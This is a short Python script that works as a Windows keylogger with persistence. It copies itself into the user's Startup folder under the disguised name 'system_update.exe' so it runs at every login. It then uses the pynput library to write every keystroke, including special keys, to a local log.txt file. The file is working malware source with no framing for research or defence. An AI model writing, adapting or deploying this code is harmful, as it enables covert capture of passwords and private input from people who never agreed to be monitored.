import os
import shutil
import sys
from pynput import keyboard

def install_persistence():
    if os.name == 'nt':  # Windows only
        startup_folder = os.path.join(os.getenv('APPDATA'), 
                                    'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        target_path = os.path.join(startup_folder, 'system_update.exe')
        
        if not os.path.exists(target_path):
            shutil.copy(sys.executable, target_path)

# Run persistence check
install_persistence()

def on_press(key):

    with open('log.txt',"a") as f:
    
        try:
            f.write(key.char)
        except AttributeError:
            f.write("\n")
            f.write(f"Special:{key}\n")

def on_release(key):
    pass

with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()

